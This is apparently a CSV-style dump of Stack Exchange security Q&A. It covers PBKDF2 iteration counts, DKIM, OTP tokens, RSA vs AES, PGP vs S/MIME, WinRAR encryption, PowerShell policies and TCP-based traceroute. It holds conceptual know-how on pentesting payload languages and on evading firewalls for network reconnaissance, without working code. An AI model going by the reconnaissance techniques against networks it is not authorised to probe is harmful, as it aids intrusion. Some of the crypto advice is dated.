","<p>Languages are useful for <em>doing things</em>. What type of things it's suitable for completely depends on the type of language, the frameworks available for it, what OSes have interpreters / compilers for it, etc.</p>

<p>Let's look at the ones you've mentioned:</p>

<ul>
<li>Perl
<ul>
<li>Scripting language</li>
<li>General purpose</li>
<li>Available on most *nix OSes since the '90s.</li>
<li>Great for quick hacks and short scripts.</li>
</ul></li>
<li>Ruby
<ul>
<li>Scripting language</li>
<li>General purpose</li>
<li>Cross-platform</li>
<li>Object-oriented</li>
<li>Reflective (can see its own structure and code)</li>
<li>Good for dynamic frameworks</li>
</ul></li>
<li>Python
<ul>
<li>Scripting language</li>
<li>General purpose</li>
<li>Cross-platform</li>
<li>Designed for clear and readable source code</li>
<li>Huge framework of libraries</li>
</ul></li>
<li>JavaScript
<ul>
<li>Scripting language</li>
<li>Web-based</li>
<li>Cross-platform (available on every major browser)</li>
</ul></li>
</ul>

<p>So what makes these particularly good for pentesting? Well, most pentesting involves writing up quick throw-away tools to do a specific job for a specific test. Writing such a tool in C or C++ every time you want to do a quick job is cumbersome and time-consuming. Furthermore, they tend to produce platform-specific binaries or source that requires platform-specific compilation, rather than cross-platform scripts that <em>just run</em>. Scripting languages give you the flexibility to produce such tools quickly and easily.</p>

<p>For example, Ruby and Python are popular for more complex tasks because they have comprehensive libraries, whereas Perl is popular for quick data processing hacks. JavaScript is commonly utilised as a simple browser-based language that everyone has access to. Other languages such as C tend to be used for more low-level tasks that interface with the OS.</p>

<p>Now, the other side of the coin is languages used as payloads. This is where the line gets blurred, because requirements are so varied. For attacking Windows boxes, any payload that has no dependencies outside of what the OS provides is useful. This might be C, C++, VBScript, x86 asm, C# / VB.NET (.NET 2.0 is on most machines these days), etc. For attacking Linux boxes you might use C, C++, bash scripts or Perl. Java is also common for cross-platform attacks.</p>

<p>At the end of the day, pick the language that <em>you</em> find best for the job!</p>
","20480"
"Recommended # of iterations when using PKBDF2-SHA256?","44835","","<p>I'm curious if anyone has any advice or points of reference when it comes to determining how many iterations is 'good enough' when using PBKDF2 (specifically with SHA-256). Certainly, 'good enough' is subjective and hard to define, varies by application &amp; risk profile, and what's 'good enough' today is likely not 'good enough' tomorrow... </p>

<p>But the question remains, what does the industry currently think 'good enough' is? What reference points are available for comparison?</p>

<p>Some references I've located:</p>

<ul>
<li>Sept 2000 - 1000+ rounds recommended (source: RFC 2898)</li>
<li>Feb 2005 - AES in Kerberos 5 'defaults' to 4096 rounds of SHA-1. (source: RFC 3962)</li>
<li>Sept 2010 - ElcomSoft claims iOS 3.x uses 2,000 iterations, iOS 4.x uses 10,000 iterations, shows BlackBerry uses 1 (exact hash algorithm is not stated) (source: <a href=""http://blog.crackpassword.com/2010/09/smartphone-forensics-cracking-blackberry-backup-passwords/"" rel=""noreferrer"">ElcomSoft</a>)</li>
<li>May 2011 - LastPass uses 100,000 iterations of SHA-256 (source: <a href=""http://blog.lastpass.com/2011/05/lastpass-security-notification.html"" rel=""noreferrer"">LastPass</a>)</li>
<li>Jun 2015 - StableBit uses 200,000 iterations of SHA-512 (source: <a href=""http://community.covecube.com/index.php?/topic/1269-full-drive-encryption/"" rel=""noreferrer"">StableBit CloudDrive Nuts &amp; Bolts</a>)</li>
<li>Aug 2015 - CloudBerry uses 1,000 iterations of SHA-1 (source: <a href=""http://www.cloudberrylab.com/download/CloudBerry%20Lab%20Security%20Considerations.pdf"" rel=""noreferrer"">CloudBerry Lab Security Consideration (pdf)</a>)</li>
</ul>

<p>I'd appreciate any additional references or feedback about how you determined how many iterations was 'good enough' for your application.</p>

<p>As additional background, I'm considering PBKDF2-SHA256 as the method used to hash user passwords for storage for a security conscious web site. My planned PBKDF2 salt is: a per-user random salt (stored in the clear with each user record) XOR'ed with a global salt. The objective is to increase the cost of brute forcing passwords and to avoid revealing pairs of users with identical passwords.</p>

<p>References:</p>

<ul>
<li>RFC 2898: PKCS #5: Password-Based Cryptography Specification v2.0</li>
<li>RFC 3962: Advanced Encryption Standard (AES) Encryption for Kerberos 5</li>
<li>PBKDF2: Password Based Key Derivation Function v2</li>
</ul>
","<p>You should use the maximum number of rounds which is tolerable, performance-wise, in your application. The number of rounds is a slowdown factor, which you use on the basis that under normal usage conditions, such a slowdown has negligible impact for you (the user will not see it, the extra CPU cost does not imply buying a bigger server, and so on). This heavily depends on the operational context: what machines are involved, how many user authentications per second... so there is no one-size-fits-all response.</p>

<p>The wide picture goes thus:</p>

<ul>
<li>The time to verify a single password is <em>v</em> on your system. You can adjust this time by selecting the number of rounds in PBKDF2.</li>
<li>A potential attacker can gather <em>f</em> times more CPU power than you (e.g. you have a single server, and the attacker has 100 big PC, each being twice faster than your server: this leads to <em>f=200</em>).</li>
<li>The average user has a password of entropy <em>n</em> bits (this means that trying to guess a user password, with a dictionary of ""plausible passwords"", will take on average <em>2<sup>n-1</sup></em> tries).</li>
<li>The attacker will find your system worth attacking if the average password can be cracked in time less than <em>p</em> (that's the attacker's ""patience"").</li>
</ul>

<p>Your goal is to make the average cost to break a single password exceed the attacker patience, so that he does not even tries to, and goes on to concentrate on another, easier target. With the notations detailed above, this means that you want:</p>

<p><em>v·2<sup>n-1</sup> &gt; f·p</em></p>

<p><em>p</em> is beyond your control; it can be estimated with regards to the <em>value</em> of the data and systems protected by the user passwords. Let's say that <em>p</em> is one month (if it takes more than one month, the attacker will not bother trying). You can make <em>f</em> smaller by buying a bigger server; on the other hand, the attacker will try to make <em>f</em> bigger by buying bigger machines. An aggravating point is that password cracking is an <a href=""http://en.wikipedia.org/wiki/Embarrassingly_parallel"">embarrassingly parallel</a> task, so the attacker will get a large boost by using <a href=""http://en.wikipedia.org/wiki/GPGPU"">GPU which support general programming</a>; so a typical <em>f</em> will still range in the order of a few hundreds.</p>

<p><em>n</em> relates to the quality of the passwords, which you can somehow influence through a strict password-selection policy, but realistically you will have a hard time getting a value of <em>n</em> beyond, say, 32 bits. If you try to enforce stronger passwords, users will begin to actively fight you, with workarounds such as reusing passwords from elsewhere, writing passwords on sticky notes, and so on.</p>

<p>So the remaining parameter is <em>v</em>. With <em>f = 200</em> (an attacker with a dozen good GPU), a patience of one month, and <em>n = 32</em>, you need <em>v</em> to be at least 241 milliseconds (note: I initially wrote ""8 milliseconds"" here, which is wrong -- this is the figure for a patience of one day instead of one month). So you should set the number of rounds in PBKDF2 such that computing it over a single password takes at least that much time on your server. You will still be able to verify four passwords per second with a single core, so the CPU impact is probably negligible(*). Actually, it is safer to use more rounds than that, because, let's face it, getting 32 bits worth of entropy out of the average user password is a bit optimistic; on the other hand, not many attacks will devote dozens of PC for one full month to the task of cracking a single password, so maybe an ""attacker's patience"" of one day is more realistic, leading to a password verification cost of 8 milliseconds.</p>

<p>So you need to make a few benchmarks. Also, the above works as long as your PBKDF2/SHA-256 implementation is fast. For instance, if you use a fully C#/Java-based implementation, you will get the typical 2 to 3 slowdown factor (compared to C or assembly) for CPU-intensive tasks; in the notations above, this is equivalent to multiplying <em>f</em> by 2 or 3. As a comparison baseline, a 2.4 GHz Core2 CPU can perform about 2.3 millions of elementary SHA-256 computations per second (with a single core), so this would imply, on that CPU, about 20000 rounds to achieve the ""8 milliseconds"" goal.</p>

<hr />

<p>(*) Take care that making password verification more expensive also makes your server more vulnerable to <a href=""https://en.wikipedia.org/wiki/Denial-of-service_attack"">Denial-of-Service attacks</a>. You should apply some basic countermeasures, such as temporarily blacklisting client IP addresses that send too many requests per second. You need to do that anyway, to thwart <em>online</em> dictionary attacks.</p>
","3993"
"How to Stop Email Spoofing","44760","","<p>Apart from SPF, what else can be done to stop hackers from spoofing your company's email addresses?</p>
","<p>Set up <a href=""http://en.wikipedia.org/wiki/DomainKeys_Identified_Mail"">Domain Keys Identified Mail</a> on your <em>own</em> domain.  That will digitally sign legitimate outgoing from your domain.  More and more email providers are rejecting or flagging spoofed email where legit email is identified with a Domain Key signature.</p>

<p><em>Added November 23:</em> Your question says, ""apart from SPF..."" and that's what I answered.  However, for others who might use this answer, <a href=""http://en.wikipedia.org/wiki/Sender_Policy_Framework"">SPF</a> is another deterrent.  It is easy to set up, but has some limitations that should be considered carefully.  You probably want to start with a SOFTFAIL policy.</p>
","73405"
"How does HSBC's ""Secure Key"" actually work?","44723","","<p>My bank has recently sent me a Digipass/Secure Key, which <a href=""https://www.hsbc.co.uk/1/2/customer-support/online-banking-security/secure-key"">looks like a tiny calculator</a>. You press the green button to turn it on, type a PIN to unlock it, then press the green button again to generate a 6-digit code that you type when logging in.</p>

<p>However, I don't actually understand how this device increases security. I'm assuming every device is linked to a person's account. But there is no communication from the device. I can press the button 10 times and generate 10 different codes, any of which seem to work.</p>

<p>How does the bank know the code is genuine? </p>
","<p>There are two standard ways to build such a device:</p>

<ul>
<li><p><strong>Time-based.</strong>  The device has a secret key <em>K</em> (known only to the device and to your bank).  When you press the button, The device computes <em>F(K, T)</em> (where <em>T</em> is the current time) and outputs it as a 6-digit code.</p>

<p>Your bank, which also knows <em>K</em>, can compute the same function.  To deal with the fact that the clocks might not be perfectly synchronized, the bank will compute a range of values and test whether the 6-digit code you provide falls anywhere in that range.  In other words, the bank might compute <em>F(K, T-2)</em>, <em>F(K, T-1)</em>, <em>F(K, T)</em>, <em>F(K, T+1)</em>, <em>F(K, T+2)</em>, and if the code  you provide matches any of those 5 values, the bank accepts your login.</p>

<p>I suspect this is not how <em>your</em> device works, since your device always gives you a different value every time you press the button. </p></li>
<li><p><strong>Sequence-based.</strong> The device has a secret key <em>K</em> (known only to the device and to your bank).  It also contains a counter <em>C</em>, which counts how many times you have pressed the button so far.  <em>C</em> is stored in non-volatile memory on your device.  When you press the button, the device increments <em>C</em>, computes <em>F(K, C)</em>, and outputs it as a 6-digit code.  This ensures that you get a different code every time.</p>

<p>The bank also tracks the current value of the counter for your device, and uses this to recognize whether the 6-digit code you provided is valid.  Often, the bank will test a window of values.  For instance, if the last counter value it saw was <em>C</em>, then the bank might compute <em>F(K, C+1)</em>, <em>F(K, C+2)</em>, <em>F(K, C+3)</em>, <em>F(K, C+4)</em> and accept your 6-digit code if it matches any of those four possibilities.  This helps ensure that if you press the button once and then don't send it to the bank, you can still log on (you aren't locked out forevermore).  In some schemes, if there is a gap in codes (e.g., because you pressed the button a few times and then didn't send the code to the bank), you will need to enter two consecutive valid codes before the bank will log you on.</p></li>
</ul>

<p>Based upon what you've told us, I would hypothesize that your device is probably using the sequence-based approach.</p>
","23902"
"Storing KeePass database in cloud. How safe?","44710","","<p>It certainly would be more convenient to store my <a href=""http://keepass.info/"">KeePass</a> database on either S3, Dropbox, or better yet SpiderOak. My fear is having my cloud storage account compromised then having the credentials recovered by either brute force or some other attack vector. How safe is this? What risks do I need to know about?</p>
","<p>It is hard to quantify exactly, but if you have the DB on a mobile device then I wouldn't say this is particularly any less secure.  KeePass encrypts the DB because the file remaining secure isn't expected to be a guarantee.  It's certainly preferable that the DB file not get in the wild, but if your security depends on the encrypted file remaining confidential, then you have bigger problems than whether to use cloud storage or not.</p>

<p>A sufficiently strong master password should prevent brute forcing at least long enough for a breach to be detected and for you to change the passwords within it.  In this way, it may even be slightly preferable to having a local copy on a mobile device as someone may compromise the file if you take your eyes off your device even momentarily and it would be much harder to identify that breach occurred.</p>

<p>If you want to secure it even further, you can add another layer of security by encrypting the file you store in cloud storage online.  The master password provides pretty good security as long as you choose a difficult to brute force password (long and truly random), but it still can't compete with an actual long encryption key.  If you encrypt the file that you store online and then keep that key with you protected by a similar master password, now the online component alone is much, much harder to decrypt (likely impossible if done correctly) and if your key file gets compromised, you simply re-encrypt your online DB immediately with a new key.  You're still in trouble if someone can compromise your cloud account first and get the file, but it requires two points of compromise instead of one.</p>

<p>Personally, I'd probably end up using my OwnCloud (which is self hosted), but I have the advantage of having my own personal web server and I realize that's not an option everyone can take advantage of.  (The only reason I haven't is that I don't have a particular need to coordinate a key database in that manner.)  Something public cloud based service should work as a fine second alternative though.</p>
","45276"
"How is PowerShell's RemoteSigned execution policy different from AllSigned?","44671","","<p>I'm still pretty new to PowerShell, and recently read this in a blog posting about creating and using PowerShell scripts.</p>

<blockquote>
  <p>To prevent the execution of malicious scripts, PowerShell enforces an execution policy. By default, the execution policy is set to Restricted, which means that PowerShell scripts will not run. You can determine the current execution policy by using the following cmdlet:</p>
  
  <p><code>Get-ExecutionPolicy</code></p>
  
  <p>The execution policies you can use are:</p>
  
  <ul>
  <li><strong>Restricted</strong> - Scripts won’t run.</li>
  <li><strong>RemoteSigned</strong> - Scripts created locally will run, but those downloaded from the Internet will not (unless they are digitally signed by a trusted publisher).</li>
  <li><strong>AllSigned</strong> - Scripts will run only if they have been signed by a trusted publisher.</li>
  <li><strong>Unrestricted</strong> - Scripts will run regardless of where they have come from and whether they are signed.</li>
  </ul>
  
  <p>You can set PowerShell’s execution policy by using the following cmdlet:</p>
  
  <p><code>Set-ExecutionPolicy &lt;policy name&gt;</code></p>
</blockquote>

<p>To me, the notation of ""<em>unless they are digitally signed by a trusted publisher</em>"" in the description of Remote Signed seems to imply that it operates the same as AllSigned.  Is there a difference I'm missing somewhere?</p>
","<p>Obviously AllSigned requires all modules/snapins and scripts to be code-signed. RemoteSigned only requires signing for remote files.  What are remote files?</p>

<p>The canonical answer is on the PowerShell blog:
<a href=""http://blogs.msdn.com/b/powershell/archive/2007/03/07/how-does-the-remotesigned-execution-policy-work.aspx"">http://blogs.msdn.com/b/powershell/archive/2007/03/07/how-does-the-remotesigned-execution-policy-work.aspx</a></p>

<p>But the bottom line is: <strong>RemoteSigned</strong> only requires code-signing on modules/snapins and scripts which are flagged as from the ""Internet"" zone in the 'Zone.Identifier' alternate data stream, unless you have ""Internet Explorer Enhanced Security"" activated, in which case it also includes ""Intranet"" flagged files and UNC paths.</p>
","1861"
"RSA maximum bytes to encrypt, comparison to AES in terms of security?","44540","","<p>What is the maximum number of bytes for encrypting a plaintext message using RSA that is reasonably secure and also efficient and would AES be better for the same size in bytes? The encryption doesn't have to be public by the way, I'm just wondering if AES is just as good on a short message as it is on a large document. Basically the message or document would be sent encrypted but the key would never be made public. I guess that would also defeat the purpose of RSA but I've read a few times online that RSA is good for short messages and AES is good for long ones.</p>
","<p>RSA, as defined by <a href=""http://www.rsa.com/rsalabs/node.asp?id=2125"">PKCS#1</a>, encrypts ""messages"" of limited size. With the commonly used ""v1.5 padding"" and a 2048-bit RSA key, the <strong>maximum</strong> size of data which can be encrypted with RSA is 245 bytes. No more.</p>

<p>When you ""encrypt data with RSA"", in practice, you are actually encrypting a random symmetric key with RSA, and then encrypt the data with a symmetric encryption algorithm, which is not limited in size. This is how it works in <a href=""http://tools.ietf.org/html/rfc5246"">SSL</a>, <a href=""http://en.wikipedia.org/wiki/S/MIME"">S/MIME</a>, <a href=""http://www.openpgp.org/"">OpenPGP</a>... Regularly, some people suggest doing ""RSA only"" by splitting the input message into 245-byte chunks and encrypting each of them more or less separately. This is a bad idea because:</p>

<ul>
<li>There can be substantial weaknesses in how the data is split and then rebuilt. There is no well-studied standard for that.</li>
<li>Each chunk, when encrypted, grows a bit (with a 2048-bit key, the 245 bytes of data become 256 bytes); when processing large amounts of data, the size overhead becomes significant.</li>
<li>Decryption of a large message may become intolerably expensive.</li>
</ul>

<hr />

<p>When encrypting data with a symmetric block cipher, which uses blocks of <em>n</em> bits, some security concerns begin to appear when the amount of data encrypted with a single key comes close to <em>2<sup>n/2</sup></em> blocks, i.e. <em>n*2<sup>n/2</sup></em> bits. With AES, <em>n = 128</em> (AES-128, AES-192 and AES-256 all use 128-bit blocks). This means a limit of more than 250 millions of terabytes, which is sufficiently large not to be a problem. That's precisely why AES was defined with 128-bit blocks, instead of the more common (at that time) 64-bit blocks: so that data size is practically unlimited.</p>
","33445"
"Advantages of client certificates for client authentication?","44526","","<p>I'm no security expert, so please just ask in a comment if I haven't made my question clear enough for an answer.</p>

<p><strong>The Scenario</strong></p>

<p>We have a server running WCF services, and a number of clients connecting.  These clients are actually Linux PCs which we build.   We need to establish secure communications between our server, and our clients (again we build them, and deploy them to customer sites).</p>

<p><strong>Client trusting the server</strong></p>

<p>We will implement this by allowing the client to establish a trusted connection with the server via implementing SSL communications. </p>

<p><strong>Server trusting the client</strong></p>

<p>We now have the task of authenticating the client.   Obviously this is done by keeping some sort of credentials on the client.  Once the client is connected, it can send the credentials to the server and the server can validate them.</p>

<p>One option for these credentials is to store some sort of Guid or other id/password which is generated by the WCF based application.   Upon receiving the credentials, the WCF service does a lookup in the database and verifies they are correct.</p>

<p>Another option is to use Certificate Services to create client certificates which are copied to the client pc before it is sent out.  After establishing the secure connection, the client sends the certificate to the server which authenticates the certificate with Certificate Services.</p>

<p><strong>The Questions</strong></p>

<p>What advantages does using a certificate to authenticate the client have over a username/guid?   What disadvantages does it have?  </p>

<p>Please consider:</p>

<ul>
<li>Security</li>
<li>Complexity of implementation</li>
<li>Complexity of programming Integration with the application.   This includes the workflow of creating the authentication token, associating appropriate (authorization / association) metadata, managing authentication such as disabling access etc.</li>
</ul>
","<p>Deploying client certs could fit here.  The advantages of using a cert over username is somewhat simple.  Anyone can type in a username from any client device.  If you're using a combination of username with guid, then the ""security"" or assurance that the client is connecting from a known/authorized client device is dependent on the strength and uniqueness of the guid.  If there's a way to clone or spoof the guid (mac addresses can be spoofed fairly easily), then the assurance level would decrease.  </p>

<p>Client certificates can be deployed to clients, with or without validity checking (aside from validity date, cn, ski/aki, fingerprint, etc).  On-demand validity checking mechanisms such as ocsp would require the server application check with an ocsp server each time client connects/attempts to auth.  But from the description, I didn't read that validity checking is as important as being able to tie cert to client device.</p>

<p>One important detail with clients certs (certs in general) is that is can be exported and most implementations do not lock down portability of the cert.  Regardless of whether or how the client certs are going to be stored, without proper measures, the cert can be easily copied from device to device.  Some implementations store the cert on the filesystem (files that end with .cer, .der, .key, .crt usually are indications that certs are stored in the filesystem).  Stronger implementations (application dependent) may store the certs and keys in a keystore (i.e. java key store).  The key store can add additional protection like ensuring the private key is not exportable.  However, the assurance that the key hasn't been exported is only as strong as the key store itself.  Hardware key stores (i.e. smart cards, usb hsm, ironkey, etc) offer a much stronger assurance that private key is not exportable than software key stores.  </p>

<p>BTW, the above point also affects server keys.  Most implementations store the private key in a software key store and is usually marked exportable.  Further, the private key is usually not password protected so anyone with access to the server can walk away with the private key.  If a cert can be copied, then it doesn't offer non-repudation.</p>

<p>To answer your question, if there's a good way of leveraging a hardware id of sorts (guid, serial number, cert stored in HSM, etc), that'll likely provide more assurance than using a software-based id (client certs included).  Using client certs with password protection enabled for private key access provides a bit stronger validation because not only does a client need to have access to the private key but also the password to use it.  </p>

<p>If you do decide to use client certs, then you'll have to build or use an existing PKI infrastructure.  Vendors like Codomo, Entrust, Symantec (formerly vrsn, thawte, and geotrust), Godaddy, and a bunch of others offer both public and private infrastructure for use.  However the cost of implementing a software-based client cert will likely be higher than using a software based hardware id or perhaps even a hardware-based unique id.  </p>

<p>If anything, determine the level of assurance you want to have and decide whether software, software + password, or hardware is sufficient.  </p>
","14590"
"Are salted SHA-256/512 hashes still safe if the hashes and their salts are exposed?","44461","","<p>Scenario: a database of hashed and and salted passwords, including salts for each password, is stolen by a malicious user. Passwords are 6-10 chars long and chosen by non-technical users.</p>

<p>Can this malicious user crack these passwords?</p>

<p>My understanding is that MD5 and SHA-1 are not safe anymore as GPU assisted password recovery tools can calculate billions of these hashes per second per GPU.</p>

<p>What about SHA-256 or SHA-512? Are they safe currently? What about in a few years?</p>
","<p>The question doesn't state how many rounds of hashing are performed. And the whole answer hinges on that point.</p>

<p>All hash functions are unsafe if you use only one iteration. The hash function, whether it is SHA-1, or one of the SHA-2 family, should be repeated thousands of times. I would consider 10,000 iterations the minimum, and 100,000 iterations is not unreasonable, given the low cost of powerful hardware.</p>

<p>Short passwords are also unsafe. 8 characters should be the minimum, even for low value targets (because users reuse the same password for multiple applications). </p>

<p>With a $150 graphics card, you can perform <a href=""http://www.golubev.com/blog/?p=35"">680 million SHA-1 hash computations per second.</a> If you use only one round of hashing, <em>all</em> 6-character passwords can be tested in a little over 15 minutes (that's assuming all 94 printable ASCII characters are used). Each additional character multiplies the time by 94, so 7 characters requires one day, 8 characters requires 103 days on this setup. Remember, this scenario is a 14-year-old using his GPU, not an organized criminal with real money.</p>

<p>Now consider the effect of performing multiple iterations. If 1,000 iterations of hashing are performed, the 6-character password space takes almost 12 days instead of 15 minutes. A 7-character space takes 3 years. If 20,000 iterations are used, those numbers go up to 8 months and 60 years, respectively. At this point, even short passwords cannot be exhaustively searched; the attacker has to fall back to a dictionary of ""most likely"" passwords.</p>
","4691"
"How does PGP differ from S/MIME?","44354","","<p>Is S/MIME an abstracted system for general MIME type encryption, whereas PGP is more for email?  Why would I want to choose one over the other, or can I use both at the same time?</p>
","<p><strong>Summary:</strong> S/MIME and PGP both provide ""secure emailing"" but use distinct encodings, formats, user tools, and key distribution models.</p>

<hr>

<p><a href=""http://en.wikipedia.org/wiki/S/MIME"">S/MIME</a> builds over <a href=""http://en.wikipedia.org/wiki/MIME"">MIME</a> and <a href=""http://tools.ietf.org/html/rfc5652"">CMS</a>. MIME is a standard way of putting arbitrary data into emails, with a ""type"" (an explicit indication of what the data is supposed to mean) and gazillions of encoding rules and other interoperability details. CMS means ""Cryptographic Message Syntax"": it is a binary format for encrypting and signing data. CMS relies on <a href=""http://en.wikipedia.org/wiki/X.509"">X.509 certificates</a> for public key distribution. X.509 was designed to support top-down hierarchical PKI: a small number of ""root certification authorities"" issue (i.e. sign) certificates for many users (or possibly intermediate CA); a user certificate contains his name (in an email context, his email address) and his public key, and is signed by a CA. Someone wanting to send an email to Bob will use Bob's certificate to get his public key (needed to encrypt the email, so that only Bob will be able to read it); verifying the signature on Bob's certificate is a way to make sure that the binding is genuine, i.e. this is really Bob's public key, not someone else's public key.</p>

<p>PGP is actually an implementation of the <a href=""http://tools.ietf.org/html/rfc4880"">OpenPGP</a> standard (historically, OpenPGP was defined as a way to standardize what the pre-existing <a href=""http://en.wikipedia.org/wiki/Pretty_Good_Privacy"">PGP</a> software did, but there now are other implementations, in particular the free opensource <a href=""http://www.gnupg.org/"">GnuPG</a>). OpenPGP defines its own encryption methods (similar in functionality to CMS) and encoding formats, in particular an encoding layer called ""ASCII Armor"" which allows binary data to travel unscathed in emails (but you can also <a href=""http://tools.ietf.org/html/rfc3156"">mix MIME and OpenPGP</a>). For public key distribution, OpenPGP relies on <a href=""http://en.wikipedia.org/wiki/Web_of_trust"">Web of Trust</a>: you can view that as a decentralized PKI where everybody is a potential CA. The security foundation of WoT is <em>redundancy</em>: you can trust a public key because it has been signed by <em>many</em> people (the idea being that if an attacker ""cannot fool everybody for a long time"").</p>

<p><strong>Theoretically</strong>, in an enterprise context, WoT does not work well; the X.509 hierarchical PKI is more appropriate, because it can be made to match the decisional structure of the envisioned companies, whereas WoT relies on employees making their own security policy decisions.</p>

<p><strong>In practice</strong>, although most emailing softwares already implement S/MIME (even Outlook Express has implemented S/MIME for about one decade), the certificate enrollment process is complex with interactions with external entities, and requires some manual interventions. OpenPGP support usually requires adding a plugin, but that plugin comes with all that is needed to manage keys. The Web of Trust is not really used: people exchange their public keys and ensure binding over another medium (e.g. spelling out the ""key fingerprint"" -- a hash value of the key -- over the phone). Then people <em>keep</em> a copy of the public keys of the people they usually exchange emails with (in the PGP ""keyring""), which ensures appropriate security and no hassle. When I need to exchange secure emails with customers, I use PGP that way.</p>

<p>OpenPGP is also used, as a signature format, for other non-email tasks, such as digitally signing software packages in some Linux distributions (at least Debian and Ubuntu do that).</p>
","7887"
"Does password protecting an archived file actually encrypt it?","44229","","<p>For example if I use WinRAR to encrypt a file and put a password on the archive how secure is it? I keep a personal journal and am thinking of doing this, or is there a better way? It's just one huge <code>.docx</code> file. </p>
","<p>Summary: yes, but use <a href=""http://veracrypt.codeplex.com/"" rel=""nofollow noreferrer"">VeraCrypt</a> instead.</p>

<hr>

<p>From the <a href=""http://www.rarlab.com/rar_archiver.htm"" rel=""nofollow noreferrer"">documentation</a>:</p>

<blockquote>
  <p>WinRAR offers you the benefit of industry strength archive encryption using AES (Advanced Encryption Standard) with a key of 128 bits.</p>
</blockquote>

<p>So yes, the data is encrypted. This is only one of the elements of security, however. Another important element is how the key is derived from the password: what kind of <a href=""https://security.stackexchange.com/questions/509/the-aescrypt-implementation-hashes-a-password-8192-times-to-generate-the-key-is"">key strengthening</a> is performed? The slower the derivation of the key from the password, the more costly it is for an attacker to find the password (and hence the key) by brute force. A weak password is toast anyway, but good key strengthening can make the difference for a <a href=""http://xkcd.com/936/"" rel=""nofollow noreferrer"">reasonably complex but still memorable password</a>. <a href=""http://blog.zorinaq.com/?e=15"" rel=""nofollow noreferrer"">WinRAR uses 262144 rounds of SHA-1 with a 64-bit salt</a>, that's good key strengthening.</p>

<p>An academic paper has been written on the security of WinRAR: <a href=""http://www.springerlink.com/content/51184370n1g2854g/"" rel=""nofollow noreferrer"">On the security of the WinRAR encryption feature</a> by Gary S.-W. Yeo and Raphael C.-W. Phan (ISC'05). Quoting from the abstract (I haven't read the full text, it doesn't seem to be accessible without paying):</p>

<blockquote>
  <p>In this paper, we present several attacks on the encryption feature provided by the WinRAR compression software. These attacks are possible due to the subtlety in developing security software based on the integration of multiple cryptographic primitives. In other words, no matter how securely designed each primitive is, using them especially in association with other primitives does not always guarantee secure systems. Instead, time and again such a practice has shown to result in flawed systems. Our results, compared to recent attacks on WinZip by Kohno, show that WinRAR appears to offer slightly better security features.</p>
</blockquote>

<p>The advantage of using the encryption built into the RAR format is that you can distribute an encrypted RAR archive to anyone with WinRAR, 7zip or other common software that supports the RAR format. For your use case, this is irrelevant. Therefore I recommend using a software that is dedicated to encryption.</p>

<p>The de facto standard since you're using Windows was <a href=""http://en.m.wikipedia.org/wiki/TrueCrypt"" rel=""nofollow noreferrer"">TrueCrypt</a>. TrueCrypt provides a virtual disk which is stored as an encrypted file. Not only is this more secure than WinRAR (I trust TrueCrypt, which is written with security in mind from day 1, far more than any product whose encryption is an ancillary feature), it is also more convenient: you mount the encrypted disk by providing your password, then you can open files on the disk transparently, and when you've finished you unmount the encrypted disk.
Sadly TrueCrypt is no longer in active development but it's successor <a href=""http://veracrypt.codeplex.com/"" rel=""nofollow noreferrer"">VeraCrypt</a> is. <a href=""http://veracrypt.codeplex.com/"" rel=""nofollow noreferrer"">VeraCrypt</a> is based on TrueCrypt and is compatible with the old TrueCrypt containers. </p>

<hr>

<blockquote>
  <p>Out of curiousity can what someone writes in their journal be used to incriminate someone in court?</p>
</blockquote>

<p>This depends on the jurisdiction, but in general, yes, as they say in the movies, anything you say or write can be used against you. You may be legally compelled to reveal encryption keys, and may face further charges if you refuse.</p>
","18289"
"How does ""traceroute over TCP"" work, what are the risks, and how can it be mitigated?","44213","","<p>There is a utility called <a href=""http://linux.die.net/man/1/tcptraceroute"">tcptraceroute</a>, and this enhancement called <a href=""https://code.google.com/p/intrace/wiki/intrace"">intrace</a> that is used just like a standard traceroute, but it works over TCP.</p>

<ul>
<li><p>How is the <code>syn</code> flag in TCP used to achieve traceroute like functionality (when ICMP is off)</p></li>
<li><p>What information can be disclosed (or other risks)?</p></li>
<li><p>How can this be mitigated?  (routers, hosts, ...both?)</p></li>
</ul>

<p>This has been described as similar to the nmap command when passed the -sS flag.  If this is accurate, what does it actually mean?</p>
","<p>All the tracerouting tools rely on the following principle: they send packets with a short life, and wait for ICMP packets reporting the death of these packets. An IP packet has a field called ""TTL"" (as ""Time To Live"") which is decremented at each hop; when it reaches 0, the packet dies, and the router on which this happens is supposed to send back a <a href=""https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Time_exceeded"">""Time Exceeded"" ICMP message</a>. That ICMP message contains the IP address of the said router, thus revealing it.</p>

<p>None of the tools you link to can do anything if some firewall blocks the ""Time Exceeded"" ICMP packets. However, blocking such packets tend to break the Internet (because hosts adaptively change the TTL in the packets they send in order to cope with long network paths, and they need these ICMP for this process), so, on a general basis, the ""Time Exceeded"" ICMP packets are not blocked.</p>

<p><strong>What is often blocked</strong>, however, is the kind of short-lived packets that <code>traceroute</code> sends. These are the packets with the artificially low TTL. If they are blocked by a firewall, they never get to die ""of old age"", and thus no Time Exceeded ICMP. For TTL-processing and the ""Time Exceeded"" ICMP, the type of packet does not matter; this occurs at the IP level. But firewalls also look at packet contents. The goal is to fool firewalls so that they allow the short-lived packet to flow (and then die).</p>

<p>Plain <code>traceroute</code> uses either UDP packets, or ICMP ""Echo"" packets, both kinds being routinely blocked by (over)zealous sysadmins. <code>tcptraceroute</code> instead uses a TCP ""SYN"" packet, i.e. the kind of packet that would occur as first step in the <a href=""https://en.wikipedia.org/wiki/Transmission_Control_Protocol"">TCP</a> ""three-way handshake"". That kind of packet is not usually blocked by firewall, at least as long as the destination port is ""allowed"". <code>tcptraceroute</code> will not complete any TCP handshake; it just relies on the ideas that SYN packets are not shot on sight by firewalls.</p>

<p><code>intrace</code> goes one step further in that it waits for an <strong>existing TCP connection</strong> (it does so by inspecting all packets, à la <code>tcpdump</code>). When it sees a connection, and the user presses ENTER, <code>intrace</code> will send short-live packets which appear as being part of the observed connection. <code>intrace</code> can do that because it has seen the packets, and so knows the IP addresses, ports and sequence numbers. All relevant firewalls will let these packets pass, since they (obviously) allow the observed TCP connection to proceed. The short-lived packets are adjusted so that they will not disrupt the TCP connection (i.e. they are simple ""ACK"" packets with no data by themselves, so the destination OS will simply ignore them).</p>

<hr />

<p><strong>Edit:</strong> I notice that I did not answer part of the question. Here it goes: there is no risk. There is nothing to mitigate.</p>

